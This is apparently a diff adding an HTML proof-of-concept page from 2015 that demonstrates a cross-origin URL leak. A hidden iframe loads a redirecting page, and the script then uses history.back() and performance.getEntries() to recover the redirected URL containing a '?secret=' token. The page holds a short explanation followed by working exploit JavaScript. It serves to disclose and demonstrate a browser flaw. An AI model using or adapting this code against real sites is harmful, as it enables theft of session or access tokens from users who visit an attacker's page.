@@ -1,0 +1,51 @@
+<!doctype html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>PoC steal URL x-domain</title>
+</head>
+<body>
+    <h1>PoC steal URL x-domain</h1>
+    <h4>18 jul 2015 by cgvwzq</h4>
+    <p>It is possible to read a x-domain URL after a redirect using <code>perfomance.getEntries()</code> if the page can be iframed.</p>
+    <p>The issue is affecting ALL current browsers (Chrome, FF and IE).</p>
+    <p>Steps:</p>
+    <ol>
+    <li>The target page (1) is loaded in our frame</li>
+    <li><code>performance</code> entry is set</li>
+    <li>The page follows the redirect to (2), x-domain pages should don't know the current URL</li>
+    <li>We redirect the frame to an arbitrary url, and force a <code>history.back()</code></li>
+    <li>The frame loads (2) from cache, and a <code>performance</code> is set</li>
+    <li>This time the entry contains the redirection (2) instead of the original url (1)</li>
+    </ol>
+    <p>It take a few seconds, anyway the delay can be reduced.</p>
+    <hr>
+    Page <code>http://demo.vwzq.net/php/token_redirect.php</code> redirected to <code id="result">...</code>.
+    <hr>
+    <iframe id="x" style="visibility:hidden;width:1px;height:1px" src="http://demo.vwzq.net/php/token_redirect.php"></iframe>
+    <script>
+    var f = document.getElementById('x').contentWindow;
+    var cache = /\?cache/.test(location.href);
+    setTimeout(function() {
+        f.location = "/";
+        setTimeout(function() {
+            f.history.back();
+            setTimeout(function() {
+                var p = performance.getEntries();
+                for (i in p) {
+                    if (p[i].name.match(/\?secret=/)) {
+                        document.getElementById('result').textContent =  p[i].name;
+                        return;
+                    }
+                }
+                if (!cache) {
+                    location = "?cache"+Math.random();
+                } else {
+                    history.go(-1);
+                }
+            }, 1000);
+        }, 1000);
+    }, 1000)
+    </script>
+</body>
+</html>
